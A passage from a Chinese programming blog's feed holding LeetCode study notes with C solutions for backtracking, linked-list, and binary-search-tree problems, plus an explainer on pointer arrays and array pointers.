    <link href="/2024/03/02/%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E5%AD%97%E6%AF%8D%E7%BB%84%E5%90%88/"/>
    <url>/2024/03/02/%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E5%AD%97%E6%AF%8D%E7%BB%84%E5%90%88/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/letter-combinations-of-a-phone-number</p><ul><li>首先定义全局变量，将每个数字对应的字符串初始化</li><li>递归的终止条件就是传入号码的长度，注意为中间变量<code>tmp</code>分配空间时要比号码长度多一个字节，用于存放'\0'</li><li>每次取一个数字，方法就是<code>digits[index]-'0'</code></li><li>然后从下标0开始遍历该数字对应的字符</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* letter[<span class="number">10</span>] = {<span class="string">""</span>, <span class="string">""</span>, <span class="string">"abc"</span>, <span class="string">"def"</span>, <span class="string">"ghi"</span>, <span class="string">"jkl"</span>, <span class="string">"mno"</span>, <span class="string">"pqrs"</span>, <span class="string">"tuv"</span>, <span class="string">"wxyz"</span>};</span><br><span class="line"><span class="type">int</span> top, res_num;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">char</span>* digits, <span class="type">int</span> start, <span class="type">char</span>** res, <span class="type">char</span>* path)</span> {</span><br><span class="line">    <span class="keyword">if</span>(top == <span class="built_in">strlen</span>(digits)) {</span><br><span class="line">        <span class="type">char</span>* tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*(<span class="built_in">strlen</span>(digits)+<span class="number">1</span>));</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(digits); i++) {</span><br><span class="line">            tmp[i] = path[i];</span><br><span class="line">        }</span><br><span class="line">        tmp[i] = <span class="string">'\0'</span>;</span><br><span class="line">        res[res_num++] = tmp;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> num = digits[start]-<span class="string">'0'</span>; <span class="comment">//每次取一个数字</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(letter[num]); i++) {  <span class="comment">//遍历num对应的字符</span></span><br><span class="line">        path[top++] = letter[num][i]; </span><br><span class="line">        backtracking(digits, start+<span class="number">1</span>, res, path);</span><br><span class="line">        top--;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>** <span class="title function_">letterCombinations</span><span class="params">(<span class="type">char</span>* digits, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(digits)==<span class="number">0</span>) {</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>** res = (<span class="type">char</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>*)*<span class="number">0</span>);;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">    top = res_num = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>** res = (<span class="type">char</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>*)*<span class="number">300</span>); <span class="comment">//注意分配空间的大小</span></span><br><span class="line">    <span class="type">char</span>* path = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*(<span class="built_in">strlen</span>(digits)+<span class="number">1</span>));</span><br><span class="line">    </span><br><span class="line">    backtracking(digits, <span class="number">0</span>, res, path);</span><br><span class="line">    *returnSize = res_num;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}   </span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>组合</title>
    <link href="/2024/03/02/%E7%BB%84%E5%90%88/"/>
    <url>/2024/03/02/%E7%BB%84%E5%90%88/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/combinations/submissions/</p><p>回溯模板：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(参数)</span> {</span><br><span class="line">    <span class="keyword">if</span> (终止条件) {</span><br><span class="line">        存放结果;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) {</span><br><span class="line">        处理节点;(例如将节点值加入数组)</span><br><span class="line">        backtracking(路径，选择列表); <span class="comment">// 递归</span></span><br><span class="line">        回溯，撤销处理结果(例如下标--)</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>将搜索过程细化为如下的树形结构（图片来自<strong>代码随想录</strong>）：</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20201123195242899.png"></p><p>因此本题代码是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> top, res_num;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>** res, <span class="type">int</span>* path, <span class="type">int</span> start, <span class="type">int</span> n, <span class="type">int</span> k)</span> {</span><br><span class="line">    <span class="keyword">if</span>(top == k) { <span class="comment">//终止条件</span></span><br><span class="line">        <span class="type">int</span>* temp = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * k); </span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; k; i++) {</span><br><span class="line">            temp[i] = path[i]; </span><br><span class="line">        }</span><br><span class="line">        res[res_num++] = temp;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;=n; i++) {</span><br><span class="line">        path[top++] = i; <span class="comment">//处理节点</span></span><br><span class="line">        backtracking(res, path, i+<span class="number">1</span>, n, k); <span class="comment">//注意参数start的变化</span></span><br><span class="line">        top--; <span class="comment">//回溯</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span>** <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span>** res = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*<span class="number">200001</span>); <span class="comment">//为结果数组分配空间，最多20个节点，组合数有限</span></span><br><span class="line">    top = res_num = <span class="number">0</span>; <span class="comment">//top是path的栈顶，res_num是结果数组res的栈顶</span></span><br><span class="line">    <span class="type">int</span>* path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*k); <span class="comment">//path空间大小为k个int所占大小</span></span><br><span class="line">    backtracking(res, path, <span class="number">1</span>, n, k);</span><br><span class="line">    *returnSize = res_num;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(*returnSize));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;res_num; i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = k;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>终止条件处定义了一个临时变量<code>temp</code>暂存<code>path</code>中的值，因为<code>path</code>回溯后内容发生变化，为了防止结果数组<code>res</code>中的结果发生变化，所以设置中间变量存放<code>path</code>数组</p></blockquote><p><strong>剪枝优化</strong>：</p><p>若当前递归的起始位置<code>start</code>到最后一个元素<code>n</code>之间的<strong>元素个数</strong>无法满足<code>path</code>所需要的元素个数（即元素总数为k），用代码表示就是<code>top+n-start+1==k</code>，若元素总个数小于<code>k</code>则直接退出当前分支。所以优化后<code>for</code>循环可改为：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;=(n-k+top+<span class="number">1</span>); i++)</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重排链表</title>
    <link href="/2024/03/02/%E9%87%8D%E6%8E%92%E9%93%BE%E8%A1%A8/"/>
    <url>/2024/03/02/%E9%87%8D%E6%8E%92%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/reorder-list/</p><p>这题是经典的双指针类型的题目，思路是：</p><ul><li>寻找链表中点（快、慢指针）</li><li>从中点开始逆序（注意细节）</li><li>合并链表（双指针，一个指针指向头节点，另一个指针指向链表中点的下一个节点）</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverse</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> { <span class="comment">//逆序</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">h</span> =</span> head;</span><br><span class="line">    <span class="keyword">while</span>(h) {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">tmp</span> =</span>  h-&gt;next; <span class="comment">//暂存h-&gt;next</span></span><br><span class="line">        h-&gt;next = p;</span><br><span class="line">        p = h; <span class="comment">//更新p</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        h = tmp; </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">reorderList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> {</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">p</span> =</span> head;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">slow</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">fast</span> =</span> head;</span><br><span class="line">    <span class="keyword">while</span>(fast &amp;&amp; slow) { <span class="comment">//找到链表中点（偶数个节点，则中点偏右）</span></span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(fast-&gt;next)</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(fast &amp;&amp; !fast-&gt;next)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(slow) <span class="comment">//将中点之后的节点逆序</span></span><br><span class="line">        slow-&gt;next = reverse(slow-&gt;next);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">virt</span> =</span> (<span class="keyword">struct</span> ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    virt-&gt;next = p; <span class="comment">//虚拟头节点virt指向头节点，方便返回</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(slow){ <span class="comment">//合并节点</span></span><br><span class="line">        <span class="keyword">while</span>(slow-&gt;next) {</span><br><span class="line">            tmp = p-&gt;next;</span><br><span class="line">            p-&gt;next = slow-&gt;next;</span><br><span class="line">            slow-&gt;next = slow-&gt;next-&gt;next;</span><br><span class="line">            p-&gt;next-&gt;next = tmp;</span><br><span class="line">            p = p-&gt;next-&gt;next;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    head = virt-&gt;next;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>指针数组和数组指针</title>
    <link href="/2024/03/01/%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84%E5%92%8C%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88/"/>
    <url>/2024/03/01/%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84%E5%92%8C%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h2 id="数组指针">数组指针</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = {<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>};</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">5</span>] = &amp;a;  <span class="comment">//a是首元素的地址，而 &amp;a 是整个数组的地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, (*pa)[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//运行结果为 8，即 (*pa)[2] == a[2]</span></span><br></pre></td></tr></tbody></table></figure><p><code>p</code>是<strong>指针</strong>，指向一个大小为5的<strong>一维数组</strong>。</p><h2 id="指针数组">指针数组</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;  </span><br><span class="line">p[<span class="number">0</span>] = &amp;a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, *p[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//运行结果为 10，p[0] 是 a 的地址，因此 *p[0] 将会解引用这个地址，得到 a 的值，也就是 10。所以运行结果将会打印出 10</span></span><br></pre></td></tr></tbody></table></figure><p><code>[]</code>比<code>*</code>的优先级更高，<code>p</code>是<strong>数组</strong>，该数组包含5个指针</p><h2 id="二维数组">二维数组</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">5</span>][<span class="number">5</span>];</span><br></pre></td></tr></tbody></table></figure><p>使用数组指针和指针数组访问二维数组元素</p><ol type="1"><li><strong>数组指针</strong></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (*p)[<span class="number">5</span>];</span><br><span class="line">p = &amp;<span class="built_in">array</span>[<span class="number">0</span>]; <span class="comment">//或 p = array;</span></span><br><span class="line"><span class="comment">/* 根据上式得：</span></span><br><span class="line"><span class="comment">(*p)[1] == array[0][1]; </span></span><br><span class="line"><span class="comment">p[1][0] == *p[1] == array[1][0]; </span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></tbody></table></figure><p>现在来看 <code>(*p)[1]</code> 、 <code>p[1]</code>和<code>*p[1]</code>的区别：</p><ul><li><code>(*p)[1]</code>（是元素）意味着先解引用<code>p</code>，得到一个数组，然后再取该数组的第二个元素。因为<code>p</code> 指向 <code>array</code> 的第一个元素，所以<code>(*p)[1]</code> 等价于 <code>array[0][1]</code>，它访问了数组<code>array</code> 的第一行的第二个元素。</li><li><code>p[1]</code>（是数组）意味着先访问 <code>p</code>的下一个元素，然后再解引用。由于 <code>p</code>指向一个包含5个整数的数组，因此 <code>p[1]</code> 将访问 <code>p</code>后面的<strong>第二个数组</strong>（假设 <code>array</code>至少有两行），然后对该数组解引用。这与 <code>array[0][1]</code>不同，因为它跳过了第一行。</li><li><code>*p[1]</code> 在 C 语言中的解释取决于 <code>p</code>的声明。在你的例子中，<code>p</code>被声明为指向包含5个整数的数组的指针。因此，<code>*p[1]</code> 表示对<code>p</code> 的第二个元素（假设 <code>p</code>指向的数组至少有两个元素）进行解引用，然后再取其第一个元素。<code>*p[1]</code><strong>等价于</strong> <code>p[1][0]</code></li></ul><ol start="2" type="1"><li><strong>指针数组</strong></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">2</span>][<span class="number">3</span>] = {{<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>}, {<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>}};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个指针数组，每个元素指向一维数组的起始地址</span></span><br><span class="line"><span class="type">int</span> *p[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 将每个一维数组的起始地址赋给指针数组的相应元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) {</span><br><span class="line">    p[i] = arr[i];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过一个循环将二维数组每行的起始地址赋给了指针数组 <code>p</code>的相应元素</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>把二叉搜索树转换为累加树</title>
    <link href="/2024/03/01/%E6%8A%8A%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E8%BD%AC%E6%8D%A2%E4%B8%BA%E7%B4%AF%E5%8A%A0%E6%A0%91/"/>
    <url>/2024/03/01/%E6%8A%8A%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E8%BD%AC%E6%8D%A2%E4%B8%BA%E7%B4%AF%E5%8A%A0%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/convert-bst-to-greater-tree</p><p>根据题目描述可知，累加过程是从右子树开始，使用递归按照<strong>右-中-左</strong>的顺序累加</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sum; <span class="comment">//全局变量，方便累加</span></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">accumulate</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    root-&gt;right = accumulate(root-&gt;right); <span class="comment">//右子树</span></span><br><span class="line">    </span><br><span class="line">    root-&gt;val += sum; <span class="comment">//处理根节点</span></span><br><span class="line">    sum = root-&gt;val;</span><br><span class="line">    </span><br><span class="line">    root-&gt;left = accumulate(root-&gt;left);  <span class="comment">//左子树</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">convertBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    sum=<span class="number">0</span>; <span class="comment">//初始化为0</span></span><br><span class="line">    <span class="keyword">return</span> accumulate(root);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将有序数组转换为二叉搜索树</title>
    <link href="/2024/03/01/%E5%B0%86%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
    <url>/2024/03/01/%E5%B0%86%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/</p><p>我原本的思路是将数组第一个元素定为根节点，然后不断插入节点，最后再将二叉树调整为平衡二叉树。不过有点太复杂了，简单题应该不会这么繁琐（主要是我不会<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>）。</p><p>正确思路是直接二分数组，去中间值为根节点，然后分为左子树和右子树，接着不断递归得到平衡二叉树。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">sortedArrayToBST</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(numsSize==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">root</span> =</span> (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">    root-&gt;val = nums[(numsSize<span class="number">-1</span>)/<span class="number">2</span>]; <span class="comment">//数组中间值</span></span><br><span class="line">    root-&gt;left = sortedArrayToBST(nums, (numsSize<span class="number">-1</span>)/<span class="number">2</span>);</span><br><span class="line">    root-&gt;right = sortedArrayToBST(nums+(numsSize+<span class="number">1</span>)/<span class="number">2</span>, (numsSize)/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修剪二叉搜索树</title>
    <link href="/2024/03/01/%E4%BF%AE%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
    <url>/2024/03/01/%E4%BF%AE%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/trim-a-binary-search-tree</p><p>根据所给范围删去节点，可以使用<a href="https://leetcode.cn/problems/delete-node-in-a-bst/">删除二叉搜索树中的节点</a>中的函数实现删除节点的步骤，同时需要注意需要从二叉树的最深处开始修剪（<strong>后序遍历</strong>），这样才能保证修剪后的二叉搜索树的父子关系不发生变化</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">deleteN</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> key)</span> { <span class="comment">//删除操作</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val &gt; key)</span><br><span class="line">        root-&gt;left = deleteN(root-&gt;left, key);</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val &lt; key)</span><br><span class="line">        root-&gt;right = deleteN(root-&gt;right, key);</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val == key) {</span><br><span 